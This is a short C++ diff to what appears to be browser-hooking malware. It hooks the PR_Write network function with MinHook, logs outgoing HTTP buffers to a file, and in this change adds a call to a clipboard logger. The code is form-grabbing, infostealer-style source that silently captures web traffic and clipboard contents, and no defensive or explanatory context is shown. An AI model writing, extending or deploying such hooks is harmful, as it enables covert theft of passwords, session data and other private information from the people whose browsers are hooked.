@@ -5,6 +5,8 @@
 #include <MinHook.h>
 #include <string>
 #include "utils.h"
+#include "ClipboardLogger.h"
+
 
 typedef int (*PR_Write_t)(void* fd, char* buf, int amount);
 PR_Write_t fpPR_Write = nullptr;
@@ -31,7 +33,8 @@ int HookedPR_Write(void* fd, char* buf, int amount)
     // log HTTP 的封包內容
     if (data.rfind("{") != std::string::npos && StrContain(data, "HTTP"))
     {
-        Log("http.txt", "--- Write ---\n");
+		ClipboardLogger();
+		Log("http.txt", "--- Write ---\n");
         Log("http.txt", buf);
         Log("http.txt", "\n---\n");
     }
